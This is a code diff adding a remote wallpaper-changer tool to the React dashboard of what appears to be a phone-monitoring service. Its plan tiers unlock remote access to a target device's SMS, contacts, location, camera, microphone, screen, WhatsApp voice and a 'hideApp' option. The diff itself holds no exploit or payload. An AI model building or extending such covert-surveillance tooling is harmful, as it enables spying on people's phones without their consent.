@@ -10,7 +10,7 @@ import {
     Image as ImageIcon, MessageSquare, Users, Flashlight, Vibrate, Camera, 
     Bell, Mic, Settings, LogOut, Smartphone, Download, Menu, X, ChevronDown, 
     Check, Play, Square, Video, RefreshCw, Search, Trash2, CheckSquare, Folder, Maximize, Minimize, Settings2, Package, Activity, Crown, Zap, Building2, MapPin,
-    Monitor, MessageCircle
+    Monitor, MessageCircle, Wallpaper
 } from 'lucide-react';
 import AppNavigation from "@/components/AppNavigation";
 import GalleryView from "@/components/views/GalleryView";
@@ -23,6 +23,7 @@ import WhatsAppVoiceView from "@/components/views/WhatsAppVoiceView";
 import LocationView from "@/components/views/LocationView";
 import NotificationsView from "@/components/views/NotificationsView";
 import FileManagerView from "@/components/views/FileManagerView";
+import WallpaperView from "@/components/views/WallpaperView";
 import { FlashlightView, VibrationView } from "@/components/views/ControlsView";
 import TelemetryCards from "@/components/dashboard/TelemetryCards";
 import WhatsAppButton from "@/components/WhatsAppButton";
@@ -61,22 +62,23 @@ interface PlanLimits {
     camera?: boolean;
     microphone?: boolean;
     notifications?: boolean;
+    wallpaper?: boolean;
 }
 
 // Compute plan limits from plan name — used as the source of truth
 const getPlanLimits = (plan: string): PlanLimits => {
     const p = (plan || '').toLowerCase();
-    if (p === 'enterprise') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: -1, fileManager: true, screenCapture: true, waVoice: true, camera: true, microphone: true, notifications: true };
-    if (p === 'premium') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: 10, fileManager: true, screenCapture: true, waVoice: true, camera: true, microphone: true, notifications: true };
-    if (p === 'standard') return { photos: 1000, videos: 1000, sms: true, contacts: true, torch: true, vibration: true, location: false, hideApp: false, bulkDownload: false, maxDevices: 5, fileManager: false, screenCapture: false, waVoice: false, camera: false, microphone: false, notifications: true };
-    return { photos: 600, videos: 0, sms: false, contacts: false, torch: false, vibration: false, location: false, hideApp: false, bulkDownload: false, maxDevices: 1, fileManager: false, screenCapture: false, waVoice: false, camera: false, microphone: false, notifications: false };
+    if (p === 'enterprise') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: -1, fileManager: true, screenCapture: true, waVoice: true, camera: true, microphone: true, notifications: true, wallpaper: true };
+    if (p === 'premium') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: 10, fileManager: true, screenCapture: true, waVoice: true, camera: true, microphone: true, notifications: true, wallpaper: true };
+    if (p === 'standard') return { photos: 1000, videos: 1000, sms: true, contacts: true, torch: true, vibration: true, location: false, hideApp: false, bulkDownload: false, maxDevices: 5, fileManager: false, screenCapture: false, waVoice: false, camera: false, microphone: false, notifications: true, wallpaper: true };
+    return { photos: 600, videos: 0, sms: false, contacts: false, torch: false, vibration: false, location: false, hideApp: false, bulkDownload: false, maxDevices: 1, fileManager: false, screenCapture: false, waVoice: false, camera: false, microphone: false, notifications: false, wallpaper: false };
 };
 
 interface HomeProps {
     initialTool?: string | null;
 }
 
-export type ToolType = 'gallery' | 'files' | 'wavoice' | 'sms' | 'contacts' | 'torch' | 'flashlight' | 'vibration' | 'camera' | 'screen' | 'notifications' | 'audio' | 'location';
+export type ToolType = 'gallery' | 'files' | 'wavoice' | 'sms' | 'contacts' | 'torch' | 'flashlight' | 'vibration' | 'wallpaper' | 'camera' | 'screen' | 'notifications' | 'audio' | 'location';
 
 const normalizeTool = (raw: string | null | undefined): ToolType | null => {
     if (!raw) return null;
@@ -86,7 +88,8 @@ const normalizeTool = (raw: string | null | undefined): ToolType | null => {
     if (clean === 'filemanager' || clean === 'file' || clean === 'explorer' || clean === 'files') return 'files';
     if (clean === 'screen' || clean === 'mirror' || clean === 'screenshot' || clean === 'display') return 'screen';
     if (clean === 'wavoice' || clean === 'whatsapp-voice' || clean === 'whatsappvoice' || clean === 'whatsapp' || clean === 'wa-voice') return 'wavoice';
-    if (['gallery', 'files', 'wavoice', 'sms', 'contacts', 'flashlight', 'vibration', 'camera', 'screen', 'notifications', 'audio', 'location'].includes(clean)) {
+    if (clean === 'wallpaper' || clean === 'wallpapers' || clean === 'background') return 'wallpaper';
+    if (['gallery', 'files', 'wavoice', 'sms', 'contacts', 'flashlight', 'vibration', 'wallpaper', 'camera', 'screen', 'notifications', 'audio', 'location'].includes(clean)) {
         return clean as any;
     }
     return null;
@@ -3521,6 +3524,49 @@ END:VCARD`;
                         vibrationDuration={vibrationDuration}
                         setVibrationDuration={setVibrationDuration}
                         triggerVibration={triggerVibration}
+                    />
+                );
+            }
+            case 'wallpaper': {
+                if (!planLimits.wallpaper) {
+                    return (
+                        <div className="flex flex-col items-center justify-center py-20 px-4 text-center max-w-md mx-auto animate-in fade-in">
+                            <div className="clay-icon-pod w-16 h-16 rounded-3xl flex items-center justify-center text-pink-400 border-pink-500/40 shadow-[0_0_30px_rgba(244,114,182,0.25)] mb-4">
+                                <Wallpaper className="w-8 h-8 text-pink-400" />
+                            </div>
+                            <h3 className="text-lg font-black text-white mb-2">Remote Wallpaper Changer</h3>
+                            <p className="text-xs text-white/50 mb-6 leading-relaxed">
+                                Remote wallpaper synchronization, custom image deployment, and lock screen theming are available in Standard, Premium, and Enterprise tiers.
+                            </p>
+                            <button
+                                type="button"
+                                onClick={() => showUpgradePrompt('Wallpaper Changer', 'standard')}
+                                className="clay-cta-button px-6 py-3 rounded-xl font-bold text-xs uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-[0_4px_16px_rgba(249,115,22,0.35)] hover:scale-105 transition-transform"
+                            >
+                                <Zap size={15} />
+                                <span>Upgrade to Standard</span>
+                            </button>
+                        </div>
+                    );
+                }
+                const effectiveTargetDevice = selectedDeviceId || selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null) || (devices.length > 0 ? String(devices[0].deviceId || devices[0].id || devices[0]._id) : null);
+                const targetDevObj = devices.find(d => String(d.deviceId || d.id || d._id) === String(effectiveTargetDevice));
+                const isOnline = !!targetDevObj?.online;
+                const devName = targetDevObj ? getCleanDeviceName(targetDevObj) : undefined;
+                return (
+                    <WallpaperView
+                        socket={socket}
+                        userUuid={userUuid}
+                        selectedDeviceId={effectiveTargetDevice}
+                        isOnline={isOnline}
+                        onTriggerOffline={() => {
+                            setOfflineModal({
+                                isOpen: true,
+                                deviceName: devName || 'Target Device',
+                                actionName: 'Wallpaper Changer'
+                            });
+                        }}
+                        requireConnectedDevice={requireConnectedDevice}
                     />
                 );
             }
